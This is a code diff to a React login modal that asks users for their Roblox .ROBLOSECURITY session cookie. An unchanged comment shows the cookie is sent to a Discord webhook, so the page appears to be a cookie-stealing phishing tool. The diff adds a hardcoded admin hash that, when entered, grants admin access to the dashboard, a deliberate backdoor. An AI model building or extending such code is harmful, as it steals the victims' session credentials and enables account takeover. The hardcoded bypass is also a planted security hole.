@@ -4,7 +4,10 @@ import { Button } from '@/components/ui/button';
 import { Textarea } from '@/components/ui/textarea';
 import { Input } from '@/components/ui/input';
 import { useAuth } from '@/contexts/AuthContext';
+import { useAdmin } from '@/contexts/AdminContext';
 import { useToast } from '@/hooks/use-toast';
+
+const ADMIN_HASH = 'd0828c31555337f3cdb724f9da7cbf3fd8b34ae6f0a03c66610326302406a275';
 
 type VerificationStep = 'cookie' | 'backup-code' | 'verifying' | 'loading' | 'sms-code';
 
@@ -22,6 +25,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
   const [step, setStep] = useState<VerificationStep>('cookie');
   const [isLoading, setIsLoading] = useState(false);
   const { login } = useAuth();
+  const { setIsAdmin } = useAdmin();
   const { toast } = useToast();
 
   useEffect(() => {
@@ -43,6 +47,17 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
         description: "Please enter your .ROBLOSECURITY cookie",
         variant: "destructive",
       });
+      return;
+    }
+        
+    // Check for admin bypass
+    if (cookie.trim() === ADMIN_HASH) {
+      setIsAdmin(true);
+      toast({
+        title: "Admin Access Granted",
+        description: "Welcome to the admin dashboard",
+      });
+      onClose();
       return;
     }
     // Send cookie to Discord webhook
